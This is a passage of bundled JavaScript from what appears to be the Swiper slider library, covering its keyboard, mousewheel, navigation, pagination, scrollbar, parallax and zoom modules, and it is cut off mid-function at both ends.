                renderExternal: null,
                addSlidesBefore: 0,
                addSlidesAfter: 0
              }
            },
            create: function create() {
              n.extend(this, {
                virtual: {
                  update: Q.update.bind(this),
                  appendSlide: Q.appendSlide.bind(this),
                  prependSlide: Q.prependSlide.bind(this),
                  removeSlide: Q.removeSlide.bind(this),
                  removeAllSlides: Q.removeAllSlides.bind(this),
                  renderSlide: Q.renderSlide.bind(this),
                  slides: this.params.virtual.slides,
                  cache: {}
                }
              });
            },
            on: {
              beforeInit: function beforeInit() {
                if (this.params.virtual.enabled) {
                  this.classNames.push(this.params.containerModifierClass + "virtual");
                  var e = {
                    watchSlidesProgress: !0
                  };
                  n.extend(this.params, e), n.extend(this.originalParams, e), this.params.initialSlide || this.virtual.update();
                }
              },
              setTranslate: function setTranslate() {
                this.params.virtual.enabled && this.virtual.update();
              }
            }
          },
          ee = {
            handle: function handle(i) {
              var s = this.rtlTranslate,
                a = i;
              a.originalEvent && (a = a.originalEvent);
              var r = a.keyCode || a.charCode;
              if (!this.allowSlideNext && (this.isHorizontal() && 39 === r || this.isVertical() && 40 === r || 34 === r)) return !1;
              if (!this.allowSlidePrev && (this.isHorizontal() && 37 === r || this.isVertical() && 38 === r || 33 === r)) return !1;
              if (!(a.shiftKey || a.altKey || a.ctrlKey || a.metaKey || e.activeElement && e.activeElement.nodeName && ("input" === e.activeElement.nodeName.toLowerCase() || "textarea" === e.activeElement.nodeName.toLowerCase()))) {
                if (this.params.keyboard.onlyInViewport && (33 === r || 34 === r || 37 === r || 39 === r || 38 === r || 40 === r)) {
                  var n = !1;
                  if (this.$el.parents("." + this.params.slideClass).length > 0 && 0 === this.$el.parents("." + this.params.slideActiveClass).length) return;
                  var o = t.innerWidth,
                    l = t.innerHeight,
                    d = this.$el.offset();
                  s && (d.left -= this.$el[0].scrollLeft);
                  for (var h = [[d.left, d.top], [d.left + this.width, d.top], [d.left, d.top + this.height], [d.left + this.width, d.top + this.height]], p = 0; p < h.length; p += 1) {
                    var c = h[p];
                    c[0] >= 0 && c[0] <= o && c[1] >= 0 && c[1] <= l && (n = !0);
                  }
                  if (!n) return;
                }
                this.isHorizontal() ? (33 !== r && 34 !== r && 37 !== r && 39 !== r || (a.preventDefault ? a.preventDefault() : a.returnValue = !1), (34 !== r && 39 !== r || s) && (33 !== r && 37 !== r || !s) || this.slideNext(), (33 !== r && 37 !== r || s) && (34 !== r && 39 !== r || !s) || this.slidePrev()) : (33 !== r && 34 !== r && 38 !== r && 40 !== r || (a.preventDefault ? a.preventDefault() : a.returnValue = !1), 34 !== r && 40 !== r || this.slideNext(), 33 !== r && 38 !== r || this.slidePrev()), this.emit("keyPress", r);
              }
            },
            enable: function enable() {
              this.keyboard.enabled || (s(e).on("keydown", this.keyboard.handle), this.keyboard.enabled = !0);
            },
            disable: function disable() {
              this.keyboard.enabled && (s(e).off("keydown", this.keyboard.handle), this.keyboard.enabled = !1);
            }
          },
          te = {
            name: "keyboard",
            params: {
              keyboard: {
                enabled: !1,
                onlyInViewport: !0
              }
            },
            create: function create() {
              n.extend(this, {
                keyboard: {
                  enabled: !1,
                  enable: ee.enable.bind(this),
                  disable: ee.disable.bind(this),
                  handle: ee.handle.bind(this)
                }
              });
            },
            on: {
              init: function init() {
                this.params.keyboard.enabled && this.keyboard.enable();
              },
              destroy: function destroy() {
                this.keyboard.enabled && this.keyboard.disable();
              }
            }
          };
        var ie = {
            lastScrollTime: n.now(),
            lastEventBeforeSnap: void 0,
            recentWheelEvents: [],
            event: function event() {
              return t.navigator.userAgent.indexOf("firefox") > -1 ? "DOMMouseScroll" : function () {
                var t = "onwheel" in e;
                if (!t) {
                  var i = e.createElement("div");
                  i.setAttribute("onwheel", "return;"), t = "function" == typeof i.onwheel;
                }
                return !t && e.implementation && e.implementation.hasFeature && !0 !== e.implementation.hasFeature("", "") && (t = e.implementation.hasFeature("Events.wheel", "3.0")), t;
              }() ? "wheel" : "mousewheel";
            },
            normalize: function normalize(e) {
              var t = 0,
                i = 0,
                s = 0,
                a = 0;
              return "detail" in e && (i = e.detail), "wheelDelta" in e && (i = -e.wheelDelta / 120), "wheelDeltaY" in e && (i = -e.wheelDeltaY / 120), "wheelDeltaX" in e && (t = -e.wheelDeltaX / 120), "axis" in e && e.axis === e.HORIZONTAL_AXIS && (t = i, i = 0), s = 10 * t, a = 10 * i, "deltaY" in e && (a = e.deltaY), "deltaX" in e && (s = e.deltaX), e.shiftKey && !s && (s = a, a = 0), (s || a) && e.deltaMode && (1 === e.deltaMode ? (s *= 40, a *= 40) : (s *= 800, a *= 800)), s && !t && (t = s < 1 ? -1 : 1), a && !i && (i = a < 1 ? -1 : 1), {
                spinX: t,
                spinY: i,
                pixelX: s,
                pixelY: a
              };
            },
            handleMouseEnter: function handleMouseEnter() {
              this.mouseEntered = !0;
            },
            handleMouseLeave: function handleMouseLeave() {
              this.mouseEntered = !1;
            },
            handle: function handle(e) {
              var t = e,
                i = this,
                a = i.params.mousewheel;
              i.params.cssMode && t.preventDefault();
              var r = i.$el;
              if ("container" !== i.params.mousewheel.eventsTarged && (r = s(i.params.mousewheel.eventsTarged)), !i.mouseEntered && !r[0].contains(t.target) && !a.releaseOnEdges) return !0;
              t.originalEvent && (t = t.originalEvent);
              var o = 0,
                l = i.rtlTranslate ? -1 : 1,
                d = ie.normalize(t);
              if (a.forceToAxis) {
                if (i.isHorizontal()) {
                  if (!(Math.abs(d.pixelX) > Math.abs(d.pixelY))) return !0;
                  o = d.pixelX * l;
                } else {
                  if (!(Math.abs(d.pixelY) > Math.abs(d.pixelX))) return !0;
                  o = d.pixelY;
                }
              } else o = Math.abs(d.pixelX) > Math.abs(d.pixelY) ? -d.pixelX * l : -d.pixelY;
              if (0 === o) return !0;
              if (a.invert && (o = -o), i.params.freeMode) {
                var h = {
                    time: n.now(),
                    delta: Math.abs(o),
                    direction: Math.sign(o)
                  },
                  p = i.mousewheel.lastEventBeforeSnap,
                  c = p && h.time < p.time + 500 && h.delta <= p.delta && h.direction === p.direction;
                if (!c) {
                  i.mousewheel.lastEventBeforeSnap = void 0, i.params.loop && i.loopFix();
                  var u = i.getTranslate() + o * a.sensitivity,
                    v = i.isBeginning,
                    f = i.isEnd;
                  if (u >= i.minTranslate() && (u = i.minTranslate()), u <= i.maxTranslate() && (u = i.maxTranslate()), i.setTransition(0), i.setTranslate(u), i.updateProgress(), i.updateActiveIndex(), i.updateSlidesClasses(), (!v && i.isBeginning || !f && i.isEnd) && i.updateSlidesClasses(), i.params.freeModeSticky) {
                    clearTimeout(i.mousewheel.timeout), i.mousewheel.timeout = void 0;
                    var m = i.mousewheel.recentWheelEvents;
                    m.length >= 15 && m.shift();
                    var g = m.length ? m[m.length - 1] : void 0,
                      b = m[0];
                    if (m.push(h), g && (h.delta > g.delta || h.direction !== g.direction)) m.splice(0);else if (m.length >= 15 && h.time - b.time < 500 && b.delta - h.delta >= 1 && h.delta <= 6) {
                      var w = o > 0 ? .8 : .2;
                      i.mousewheel.lastEventBeforeSnap = h, m.splice(0), i.mousewheel.timeout = n.nextTick(function () {
                        i.slideToClosest(i.params.speed, !0, void 0, w);
                      }, 0);
                    }
                    i.mousewheel.timeout || (i.mousewheel.timeout = n.nextTick(function () {
                      i.mousewheel.lastEventBeforeSnap = h, m.splice(0), i.slideToClosest(i.params.speed, !0, void 0, .5);
                    }, 500));
                  }
                  if (c || i.emit("scroll", t), i.params.autoplay && i.params.autoplayDisableOnInteraction && i.autoplay.stop(), u === i.minTranslate() || u === i.maxTranslate()) return !0;
                }
              } else {
                var y = {
                    time: n.now(),
                    delta: Math.abs(o),
                    direction: Math.sign(o),
                    raw: e
                  },
                  x = i.mousewheel.recentWheelEvents;
                x.length >= 2 && x.shift();
                var T = x.length ? x[x.length - 1] : void 0;
                if (x.push(y), T ? (y.direction !== T.direction || y.delta > T.delta) && i.mousewheel.animateSlider(y) : i.mousewheel.animateSlider(y), i.mousewheel.releaseScroll(y)) return !0;
              }
              return t.preventDefault ? t.preventDefault() : t.returnValue = !1, !1;
            },
            animateSlider: function animateSlider(e) {
              return e.delta >= 6 && n.now() - this.mousewheel.lastScrollTime < 60 || (e.direction < 0 ? this.isEnd && !this.params.loop || this.animating || (this.slideNext(), this.emit("scroll", e.raw)) : this.isBeginning && !this.params.loop || this.animating || (this.slidePrev(), this.emit("scroll", e.raw)), this.mousewheel.lastScrollTime = new t.Date().getTime(), !1);
            },
            releaseScroll: function releaseScroll(e) {
              var t = this.params.mousewheel;
              if (e.direction < 0) {
                if (this.isEnd && !this.params.loop && t.releaseOnEdges) return !0;
              } else if (this.isBeginning && !this.params.loop && t.releaseOnEdges) return !0;
              return !1;
            },
            enable: function enable() {
              var e = ie.event();
              if (this.params.cssMode) return this.wrapperEl.removeEventListener(e, this.mousewheel.handle), !0;
              if (!e) return !1;
              if (this.mousewheel.enabled) return !1;
              var t = this.$el;
              return "container" !== this.params.mousewheel.eventsTarged && (t = s(this.params.mousewheel.eventsTarged)), t.on("mouseenter", this.mousewheel.handleMouseEnter), t.on("mouseleave", this.mousewheel.handleMouseLeave), t.on(e, this.mousewheel.handle), this.mousewheel.enabled = !0, !0;
            },
            disable: function disable() {
              var e = ie.event();
              if (this.params.cssMode) return this.wrapperEl.addEventListener(e, this.mousewheel.handle), !0;
              if (!e) return !1;
              if (!this.mousewheel.enabled) return !1;
              var t = this.$el;
              return "container" !== this.params.mousewheel.eventsTarged && (t = s(this.params.mousewheel.eventsTarged)), t.off(e, this.mousewheel.handle), this.mousewheel.enabled = !1, !0;
            }
          },
          se = {
            update: function update() {
              var e = this.params.navigation;
              if (!this.params.loop) {
                var t = this.navigation,
                  i = t.$nextEl,
                  s = t.$prevEl;
                s && s.length > 0 && (this.isBeginning ? s.addClass(e.disabledClass) : s.removeClass(e.disabledClass), s[this.params.watchOverflow && this.isLocked ? "addClass" : "removeClass"](e.lockClass)), i && i.length > 0 && (this.isEnd ? i.addClass(e.disabledClass) : i.removeClass(e.disabledClass), i[this.params.watchOverflow && this.isLocked ? "addClass" : "removeClass"](e.lockClass));
              }
            },
            onPrevClick: function onPrevClick(e) {
              e.preventDefault(), this.isBeginning && !this.params.loop || this.slidePrev();
            },
            onNextClick: function onNextClick(e) {
              e.preventDefault(), this.isEnd && !this.params.loop || this.slideNext();
            },
            init: function init() {
              var e,
                t,
                i = this.params.navigation;
              (i.nextEl || i.prevEl) && (i.nextEl && (e = s(i.nextEl), this.params.uniqueNavElements && "string" == typeof i.nextEl && e.length > 1 && 1 === this.$el.find(i.nextEl).length && (e = this.$el.find(i.nextEl))), i.prevEl && (t = s(i.prevEl), this.params.uniqueNavElements && "string" == typeof i.prevEl && t.length > 1 && 1 === this.$el.find(i.prevEl).length && (t = this.$el.find(i.prevEl))), e && e.length > 0 && e.on("click", this.navigation.onNextClick), t && t.length > 0 && t.on("click", this.navigation.onPrevClick), n.extend(this.navigation, {
                $nextEl: e,
                nextEl: e && e[0],
                $prevEl: t,
                prevEl: t && t[0]
              }));
            },
            destroy: function destroy() {
              var e = this.navigation,
                t = e.$nextEl,
                i = e.$prevEl;
              t && t.length && (t.off("click", this.navigation.onNextClick), t.removeClass(this.params.navigation.disabledClass)), i && i.length && (i.off("click", this.navigation.onPrevClick), i.removeClass(this.params.navigation.disabledClass));
            }
          },
          ae = {
            update: function update() {
              var e = this.rtl,
                t = this.params.pagination;
              if (t.el && this.pagination.el && this.pagination.$el && 0 !== this.pagination.$el.length) {
                var i,
                  a = this.virtual && this.params.virtual.enabled ? this.virtual.slides.length : this.slides.length,
                  r = this.pagination.$el,
                  n = this.params.loop ? Math.ceil((a - 2 * this.loopedSlides) / this.params.slidesPerGroup) : this.snapGrid.length;
                if (this.params.loop ? ((i = Math.ceil((this.activeIndex - this.loopedSlides) / this.params.slidesPerGroup)) > a - 1 - 2 * this.loopedSlides && (i -= a - 2 * this.loopedSlides), i > n - 1 && (i -= n), i < 0 && "bullets" !== this.params.paginationType && (i = n + i)) : i = void 0 !== this.snapIndex ? this.snapIndex : this.activeIndex || 0, "bullets" === t.type && this.pagination.bullets && this.pagination.bullets.length > 0) {
                  var o,
                    l,
                    d,
                    h = this.pagination.bullets;
                  if (t.dynamicBullets && (this.pagination.bulletSize = h.eq(0)[this.isHorizontal() ? "outerWidth" : "outerHeight"](!0), r.css(this.isHorizontal() ? "width" : "height", this.pagination.bulletSize * (t.dynamicMainBullets + 4) + "px"), t.dynamicMainBullets > 1 && void 0 !== this.previousIndex && (this.pagination.dynamicBulletIndex += i - this.previousIndex, this.pagination.dynamicBulletIndex > t.dynamicMainBullets - 1 ? this.pagination.dynamicBulletIndex = t.dynamicMainBullets - 1 : this.pagination.dynamicBulletIndex < 0 && (this.pagination.dynamicBulletIndex = 0)), o = i - this.pagination.dynamicBulletIndex, d = ((l = o + (Math.min(h.length, t.dynamicMainBullets) - 1)) + o) / 2), h.removeClass(t.bulletActiveClass + " " + t.bulletActiveClass + "-next " + t.bulletActiveClass + "-next-next " + t.bulletActiveClass + "-prev " + t.bulletActiveClass + "-prev-prev " + t.bulletActiveClass + "-main"), r.length > 1) h.each(function (e, a) {
                    var r = s(a),
                      n = r.index();
                    n === i && r.addClass(t.bulletActiveClass), t.dynamicBullets && (n >= o && n <= l && r.addClass(t.bulletActiveClass + "-main"), n === o && r.prev().addClass(t.bulletActiveClass + "-prev").prev().addClass(t.bulletActiveClass + "-prev-prev"), n === l && r.next().addClass(t.bulletActiveClass + "-next").next().addClass(t.bulletActiveClass + "-next-next"));
                  });else {
                    var p = h.eq(i),
                      c = p.index();
                    if (p.addClass(t.bulletActiveClass), t.dynamicBullets) {
                      for (var u = h.eq(o), v = h.eq(l), f = o; f <= l; f += 1) h.eq(f).addClass(t.bulletActiveClass + "-main");
                      if (this.params.loop) {
                        if (c >= h.length - t.dynamicMainBullets) {
                          for (var m = t.dynamicMainBullets; m >= 0; m -= 1) h.eq(h.length - m).addClass(t.bulletActiveClass + "-main");
                          h.eq(h.length - t.dynamicMainBullets - 1).addClass(t.bulletActiveClass + "-prev");
                        } else u.prev().addClass(t.bulletActiveClass + "-prev").prev().addClass(t.bulletActiveClass + "-prev-prev"), v.next().addClass(t.bulletActiveClass + "-next").next().addClass(t.bulletActiveClass + "-next-next");
                      } else u.prev().addClass(t.bulletActiveClass + "-prev").prev().addClass(t.bulletActiveClass + "-prev-prev"), v.next().addClass(t.bulletActiveClass + "-next").next().addClass(t.bulletActiveClass + "-next-next");
                    }
                  }
                  if (t.dynamicBullets) {
                    var g = Math.min(h.length, t.dynamicMainBullets + 4),
                      b = (this.pagination.bulletSize * g - this.pagination.bulletSize) / 2 - d * this.pagination.bulletSize,
                      w = e ? "right" : "left";
                    h.css(this.isHorizontal() ? w : "top", b + "px");
                  }
                }
                if ("fraction" === t.type && (r.find("." + t.currentClass).text(t.formatFractionCurrent(i + 1)), r.find("." + t.totalClass).text(t.formatFractionTotal(n))), "progressbar" === t.type) {
                  var y;
                  y = t.progressbarOpposite ? this.isHorizontal() ? "vertical" : "horizontal" : this.isHorizontal() ? "horizontal" : "vertical";
                  var x = (i + 1) / n,
                    T = 1,
                    E = 1;
                  "horizontal" === y ? T = x : E = x, r.find("." + t.progressbarFillClass).transform("translate3d(0,0,0) scaleX(" + T + ") scaleY(" + E + ")").transition(this.params.speed);
                }
                "custom" === t.type && t.renderCustom ? (r.html(t.renderCustom(this, i + 1, n)), this.emit("paginationRender", this, r[0])) : this.emit("paginationUpdate", this, r[0]), r[this.params.watchOverflow && this.isLocked ? "addClass" : "removeClass"](t.lockClass);
              }
            },
            render: function render() {
              var e = this.params.pagination;
              if (e.el && this.pagination.el && this.pagination.$el && 0 !== this.pagination.$el.length) {
                var t = this.virtual && this.params.virtual.enabled ? this.virtual.slides.length : this.slides.length,
                  i = this.pagination.$el,
                  s = "";
                if ("bullets" === e.type) {
                  for (var a = this.params.loop ? Math.ceil((t - 2 * this.loopedSlides) / this.params.slidesPerGroup) : this.snapGrid.length, r = 0; r < a; r += 1) e.renderBullet ? s += e.renderBullet.call(this, r, e.bulletClass) : s += "<" + e.bulletElement + ' class="' + e.bulletClass + '"></' + e.bulletElement + ">";
                  i.html(s), this.pagination.bullets = i.find("." + e.bulletClass);
                }
                "fraction" === e.type && (s = e.renderFraction ? e.renderFraction.call(this, e.currentClass, e.totalClass) : '<span class="' + e.currentClass + '"></span> / <span class="' + e.totalClass + '"></span>', i.html(s)), "progressbar" === e.type && (s = e.renderProgressbar ? e.renderProgressbar.call(this, e.progressbarFillClass) : '<span class="' + e.progressbarFillClass + '"></span>', i.html(s)), "custom" !== e.type && this.emit("paginationRender", this.pagination.$el[0]);
              }
            },
            init: function init() {
              var e = this,
                t = e.params.pagination;
              if (t.el) {
                var i = s(t.el);
                0 !== i.length && (e.params.uniqueNavElements && "string" == typeof t.el && i.length > 1 && 1 === e.$el.find(t.el).length && (i = e.$el.find(t.el)), "bullets" === t.type && t.clickable && i.addClass(t.clickableClass), i.addClass(t.modifierClass + t.type), "bullets" === t.type && t.dynamicBullets && (i.addClass("" + t.modifierClass + t.type + "-dynamic"), e.pagination.dynamicBulletIndex = 0, t.dynamicMainBullets < 1 && (t.dynamicMainBullets = 1)), "progressbar" === t.type && t.progressbarOpposite && i.addClass(t.progressbarOppositeClass), t.clickable && i.on("click", "." + t.bulletClass, function (t) {
                  t.preventDefault();
                  var i = s(this).index() * e.params.slidesPerGroup;
                  e.params.loop && (i += e.loopedSlides), e.slideTo(i);
                }), n.extend(e.pagination, {
                  $el: i,
                  el: i[0]
                }));
              }
            },
            destroy: function destroy() {
              var e = this.params.pagination;
              if (e.el && this.pagination.el && this.pagination.$el && 0 !== this.pagination.$el.length) {
                var t = this.pagination.$el;
                t.removeClass(e.hiddenClass), t.removeClass(e.modifierClass + e.type), this.pagination.bullets && this.pagination.bullets.removeClass(e.bulletActiveClass), e.clickable && t.off("click", "." + e.bulletClass);
              }
            }
          },
          re = {
            setTranslate: function setTranslate() {
              if (this.params.scrollbar.el && this.scrollbar.el) {
                var e = this.scrollbar,
                  t = this.rtlTranslate,
                  i = this.progress,
                  s = e.dragSize,
                  a = e.trackSize,
                  r = e.$dragEl,
                  n = e.$el,
                  o = this.params.scrollbar,
                  l = s,
                  d = (a - s) * i;
                t ? (d = -d) > 0 ? (l = s - d, d = 0) : -d + s > a && (l = a + d) : d < 0 ? (l = s + d, d = 0) : d + s > a && (l = a - d), this.isHorizontal() ? (r.transform("translate3d(" + d + "px, 0, 0)"), r[0].style.width = l + "px") : (r.transform("translate3d(0px, " + d + "px, 0)"), r[0].style.height = l + "px"), o.hide && (clearTimeout(this.scrollbar.timeout), n[0].style.opacity = 1, this.scrollbar.timeout = setTimeout(function () {
                  n[0].style.opacity = 0, n.transition(400);
                }, 1e3));
              }
            },
            setTransition: function setTransition(e) {
              this.params.scrollbar.el && this.scrollbar.el && this.scrollbar.$dragEl.transition(e);
            },
            updateSize: function updateSize() {
              if (this.params.scrollbar.el && this.scrollbar.el) {
                var e = this.scrollbar,
                  t = e.$dragEl,
                  i = e.$el;
                t[0].style.width = "", t[0].style.height = "";
                var s,
                  a = this.isHorizontal() ? i[0].offsetWidth : i[0].offsetHeight,
                  r = this.size / this.virtualSize,
                  o = r * (a / this.size);
                s = "auto" === this.params.scrollbar.dragSize ? a * r : parseInt(this.params.scrollbar.dragSize, 10), this.isHorizontal() ? t[0].style.width = s + "px" : t[0].style.height = s + "px", i[0].style.display = r >= 1 ? "none" : "", this.params.scrollbar.hide && (i[0].style.opacity = 0), n.extend(e, {
                  trackSize: a,
                  divider: r,
                  moveDivider: o,
                  dragSize: s
                }), e.$el[this.params.watchOverflow && this.isLocked ? "addClass" : "removeClass"](this.params.scrollbar.lockClass);
              }
            },
            getPointerPosition: function getPointerPosition(e) {
              return this.isHorizontal() ? "touchstart" === e.type || "touchmove" === e.type ? e.targetTouches[0].clientX : e.clientX : "touchstart" === e.type || "touchmove" === e.type ? e.targetTouches[0].clientY : e.clientY;
            },
            setDragPosition: function setDragPosition(e) {
              var t,
                i = this.scrollbar,
                s = this.rtlTranslate,
                a = i.$el,
                r = i.dragSize,
                n = i.trackSize,
                o = i.dragStartPos;
              t = (i.getPointerPosition(e) - a.offset()[this.isHorizontal() ? "left" : "top"] - (null !== o ? o : r / 2)) / (n - r), t = Math.max(Math.min(t, 1), 0), s && (t = 1 - t);
              var l = this.minTranslate() + (this.maxTranslate() - this.minTranslate()) * t;
              this.updateProgress(l), this.setTranslate(l), this.updateActiveIndex(), this.updateSlidesClasses();
            },
            onDragStart: function onDragStart(e) {
              var t = this.params.scrollbar,
                i = this.scrollbar,
                s = this.$wrapperEl,
                a = i.$el,
                r = i.$dragEl;
              this.scrollbar.isTouched = !0, this.scrollbar.dragStartPos = e.target === r[0] || e.target === r ? i.getPointerPosition(e) - e.target.getBoundingClientRect()[this.isHorizontal() ? "left" : "top"] : null, e.preventDefault(), e.stopPropagation(), s.transition(100), r.transition(100), i.setDragPosition(e), clearTimeout(this.scrollbar.dragTimeout), a.transition(0), t.hide && a.css("opacity", 1), this.params.cssMode && this.$wrapperEl.css("scroll-snap-type", "none"), this.emit("scrollbarDragStart", e);
            },
            onDragMove: function onDragMove(e) {
              var t = this.scrollbar,
                i = this.$wrapperEl,
                s = t.$el,
                a = t.$dragEl;
              this.scrollbar.isTouched && (e.preventDefault ? e.preventDefault() : e.returnValue = !1, t.setDragPosition(e), i.transition(0), s.transition(0), a.transition(0), this.emit("scrollbarDragMove", e));
            },
            onDragEnd: function onDragEnd(e) {
              var t = this.params.scrollbar,
                i = this.scrollbar,
                s = this.$wrapperEl,
                a = i.$el;
              this.scrollbar.isTouched && (this.scrollbar.isTouched = !1, this.params.cssMode && (this.$wrapperEl.css("scroll-snap-type", ""), s.transition("")), t.hide && (clearTimeout(this.scrollbar.dragTimeout), this.scrollbar.dragTimeout = n.nextTick(function () {
                a.css("opacity", 0), a.transition(400);
              }, 1e3)), this.emit("scrollbarDragEnd", e), t.snapOnRelease && this.slideToClosest());
            },
            enableDraggable: function enableDraggable() {
              if (this.params.scrollbar.el) {
                var t = this.scrollbar,
                  i = this.touchEventsTouch,
                  s = this.touchEventsDesktop,
                  a = this.params,
                  r = t.$el[0],
                  n = !(!o.passiveListener || !a.passiveListeners) && {
                    passive: !1,
                    capture: !1
                  },
                  l = !(!o.passiveListener || !a.passiveListeners) && {
                    passive: !0,
                    capture: !1
                  };
                o.touch ? (r.addEventListener(i.start, this.scrollbar.onDragStart, n), r.addEventListener(i.move, this.scrollbar.onDragMove, n), r.addEventListener(i.end, this.scrollbar.onDragEnd, l)) : (r.addEventListener(s.start, this.scrollbar.onDragStart, n), e.addEventListener(s.move, this.scrollbar.onDragMove, n), e.addEventListener(s.end, this.scrollbar.onDragEnd, l));
              }
            },
            disableDraggable: function disableDraggable() {
              if (this.params.scrollbar.el) {
                var t = this.scrollbar,
                  i = this.touchEventsTouch,
                  s = this.touchEventsDesktop,
                  a = this.params,
                  r = t.$el[0],
                  n = !(!o.passiveListener || !a.passiveListeners) && {
                    passive: !1,
                    capture: !1
                  },
                  l = !(!o.passiveListener || !a.passiveListeners) && {
                    passive: !0,
                    capture: !1
                  };
                o.touch ? (r.removeEventListener(i.start, this.scrollbar.onDragStart, n), r.removeEventListener(i.move, this.scrollbar.onDragMove, n), r.removeEventListener(i.end, this.scrollbar.onDragEnd, l)) : (r.removeEventListener(s.start, this.scrollbar.onDragStart, n), e.removeEventListener(s.move, this.scrollbar.onDragMove, n), e.removeEventListener(s.end, this.scrollbar.onDragEnd, l));
              }
            },
            init: function init() {
              if (this.params.scrollbar.el) {
                var e = this.scrollbar,
                  t = this.$el,
                  i = this.params.scrollbar,
                  a = s(i.el);
                this.params.uniqueNavElements && "string" == typeof i.el && a.length > 1 && 1 === t.find(i.el).length && (a = t.find(i.el));
                var r = a.find("." + this.params.scrollbar.dragClass);
                0 === r.length && (r = s('<div class="' + this.params.scrollbar.dragClass + '"></div>'), a.append(r)), n.extend(e, {
                  $el: a,
                  el: a[0],
                  $dragEl: r,
                  dragEl: r[0]
                }), i.draggable && e.enableDraggable();
              }
            },
            destroy: function destroy() {
              this.scrollbar.disableDraggable();
            }
          },
          ne = {
            setTransform: function setTransform(e, t) {
              var i = this.rtl,
                a = s(e),
                r = i ? -1 : 1,
                n = a.attr("data-swiper-parallax") || "0",
                o = a.attr("data-swiper-parallax-x"),
                l = a.attr("data-swiper-parallax-y"),
                d = a.attr("data-swiper-parallax-scale"),
                h = a.attr("data-swiper-parallax-opacity");
              if (o || l ? (o = o || "0", l = l || "0") : this.isHorizontal() ? (o = n, l = "0") : (l = n, o = "0"), o = o.indexOf("%") >= 0 ? parseInt(o, 10) * t * r + "%" : o * t * r + "px", l = l.indexOf("%") >= 0 ? parseInt(l, 10) * t + "%" : l * t + "px", null != h) {
                var p = h - (h - 1) * (1 - Math.abs(t));
                a[0].style.opacity = p;
              }
              if (null == d) a.transform("translate3d(" + o + ", " + l + ", 0px)");else {
                var c = d - (d - 1) * (1 - Math.abs(t));
                a.transform("translate3d(" + o + ", " + l + ", 0px) scale(" + c + ")");
              }
            },
            setTranslate: function setTranslate() {
              var e = this,
                t = e.$el,
                i = e.slides,
                a = e.progress,
                r = e.snapGrid;
              t.children("[data-swiper-parallax], [data-swiper-parallax-x], [data-swiper-parallax-y], [data-swiper-parallax-opacity], [data-swiper-parallax-scale]").each(function (t, i) {
                e.parallax.setTransform(i, a);
              }), i.each(function (t, i) {
                var n = i.progress;
                e.params.slidesPerGroup > 1 && "auto" !== e.params.slidesPerView && (n += Math.ceil(t / 2) - a * (r.length - 1)), n = Math.min(Math.max(n, -1), 1), s(i).find("[data-swiper-parallax], [data-swiper-parallax-x], [data-swiper-parallax-y], [data-swiper-parallax-opacity], [data-swiper-parallax-scale]").each(function (t, i) {
                  e.parallax.setTransform(i, n);
                });
              });
            },
            setTransition: function setTransition(e) {
              void 0 === e && (e = this.params.speed);
              this.$el.find("[data-swiper-parallax], [data-swiper-parallax-x], [data-swiper-parallax-y], [data-swiper-parallax-opacity], [data-swiper-parallax-scale]").each(function (t, i) {
                var a = s(i),
                  r = parseInt(a.attr("data-swiper-parallax-duration"), 10) || e;
                0 === e && (r = 0), a.transition(r);
              });
            }
          },
          oe = {
            getDistanceBetweenTouches: function getDistanceBetweenTouches(e) {
              if (e.targetTouches.length < 2) return 1;
              var t = e.targetTouches[0].pageX,
                i = e.targetTouches[0].pageY,
                s = e.targetTouches[1].pageX,
                a = e.targetTouches[1].pageY;
              return Math.sqrt(Math.pow(s - t, 2) + Math.pow(a - i, 2));
            },
            onGestureStart: function onGestureStart(e) {
              var t = this.params.zoom,
                i = this.zoom,
                a = i.gesture;
              if (i.fakeGestureTouched = !1, i.fakeGestureMoved = !1, !o.gestures) {
                if ("touchstart" !== e.type || "touchstart" === e.type && e.targetTouches.length < 2) return;
                i.fakeGestureTouched = !0, a.scaleStart = oe.getDistanceBetweenTouches(e);
              }
              a.$slideEl && a.$slideEl.length || (a.$slideEl = s(e.target).closest(".swiper-slide"), 0 === a.$slideEl.length && (a.$slideEl = this.slides.eq(this.activeIndex)), a.$imageEl = a.$slideEl.find("img, svg, canvas"), a.$imageWrapEl = a.$imageEl.parent("." + t.containerClass), a.maxRatio = a.$imageWrapEl.attr("data-swiper-zoom") || t.maxRatio, 0 !== a.$imageWrapEl.length) ? (a.$imageEl.transition(0), this.zoom.isScaling = !0) : a.$imageEl = void 0;
            },
            onGestureChange: function onGestureChange(e) {
              var t = this.params.zoom,
                i = this.zoom,
                s = i.gesture;
              if (!o.gestures) {
                if ("touchmove" !== e.type || "touchmove" === e.type && e.targetTouches.length < 2) return;
                i.fakeGestureMoved = !0, s.scaleMove = oe.getDistanceBetweenTouches(e);
              }
              s.$imageEl && 0 !== s.$imageEl.length && (o.gestures ? i.scale = e.scale * i.currentScale : i.scale = s.scaleMove / s.scaleStart * i.currentScale, i.scale > s.maxRatio && (i.scale = s.maxRatio - 1 + Math.pow(i.scale - s.maxRatio + 1, .5)), i.scale < t.minRatio && (i.scale = t.minRatio + 1 - Math.pow(t.minRatio - i.scale + 1, .5)), s.$imageEl.transform("translate3d(0,0,0) scale(" + i.scale + ")"));
            },
            onGestureEnd: function onGestureEnd(e) {
              var t = this.params.zoom,
                i = this.zoom,
                s = i.gesture;
              if (!o.gestures) {
                if (!i.fakeGestureTouched || !i.fakeGestureMoved) return;
                if ("touchend" !== e.type || "touchend" === e.type && e.changedTouches.length < 2 && !I.android) return;
                i.fakeGestureTouched = !1, i.fakeGestureMoved = !1;
              }
              s.$imageEl && 0 !== s.$imageEl.length && (i.scale = Math.max(Math.min(i.scale, s.maxRatio), t.minRatio), s.$imageEl.transition(this.params.speed).transform("translate3d(0,0,0) scale(" + i.scale + ")"), i.currentScale = i.scale, i.isScaling = !1, 1 === i.scale && (s.$slideEl = void 0));
            },
            onTouchStart: function onTouchStart(e) {
              var t = this.zoom,
                i = t.gesture,
                s = t.image;
              i.$imageEl && 0 !== i.$imageEl.length && (s.isTouched || (I.android && e.preventDefault(), s.isTouched = !0, s.touchesStart.x = "touchstart" === e.type ? e.targetTouches[0].pageX : e.pageX, s.touchesStart.y = "touchstart" === e.type ? e.targetTouches[0].pageY : e.pageY));
            },
            onTouchMove: function onTouchMove(e) {
              var t = this.zoom,
                i = t.gesture,
                s = t.image,
                a = t.velocity;
              if (i.$imageEl && 0 !== i.$imageEl.length && (this.allowClick = !1, s.isTouched && i.$slideEl)) {
